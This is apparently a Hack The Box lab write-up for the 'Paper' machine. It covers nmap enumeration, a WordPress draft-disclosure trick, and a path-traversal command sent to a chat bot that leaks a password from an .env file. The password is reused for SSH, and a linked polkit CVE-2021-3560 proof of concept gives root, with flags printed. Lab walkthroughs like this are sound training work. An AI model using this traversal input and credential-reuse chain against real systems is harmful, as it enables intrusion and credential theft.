# Paper

## Enumeration

nmap:
```bash
┌──(kali㉿kali)-[~/Sec/HackTheBox/Machines/Paper]
└─$ nmap -sC -sV 10.10.11.143 -oA scans/nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-09 14:02 EDT
Nmap scan report for 10.10.11.143
Host is up (0.049s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
```

### Port 80

In head:
```html
<meta name="generator" content="HTML Tidy for HTML5 for Linux version 5.7.28">
<title>HTTP Server Test Page powered by CentOS</title>
```

`/cgi-bin` folder is present.

PHP Version: `PHP/7.2.24`.

Header: `X-Backend-Server: office.paper`.

Server: `Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9`.

When adding `office.paper` to `/etc/hosts`:

![](Pasted%20image%2020220609143951.png)

Users found:
- prisonmike
- jan
- nick

Nick said: `Michael, you should remove the secret content from your drafts ASAP`.

WordPress version: `5.2.3`

## Enumeration

On Google: https://www.exploit-db.com/exploits/47690

On this link, drafts are disclosed: http://office.paper/?static=1

Secret found:

```bash
# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY
```

Adding `chat.office.paper` to `/etc/hosts` show this page:

![](Pasted%20image%2020220609150712.png)

Once logged in the chat, a bot is present, which can be DM'd:

```
recyclops file ../hubot/.env

-   Bot 3:18 PM
    
    <!=====Contents of file ../hubot/.env=====>
    
-   <!=====Contents of file ../hubot/.env=====>
    
-   export ROCKETCHAT_URL='[http://127.0.0.1:48320](http://127.0.0.1:48320)'  
    export ROCKETCHAT_USER=recyclops  
    export ROCKETCHAT_PASSWORD=Queenofblad3s!23  
    export ROCKETCHAT_USESSL=false  
    export RESPOND_TO_DM=true  
    export RESPOND_TO_EDITED=true  
    export PORT=8000  
    export BIND_ADDRESS=127.0.0.1
```

After a test: `dwight:Queenofblad3s!23` is a set of credentials.

`user.txt`: `8ef445c15fc077583aec9b7ba2aab2d3`

## Post-Exploitation

Using `linpeas.sh`,  a CVE seems to be usable:
```bash
╔══════════╣ CVEs Check                                                                                                                                                                                                                  
Vulnerable to CVE-2021-3560
```

Using this PoC: https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh

Created a user and spawned a root shell.

`root.txt`: `d5a268920b8834ba615d44431e9b91fc`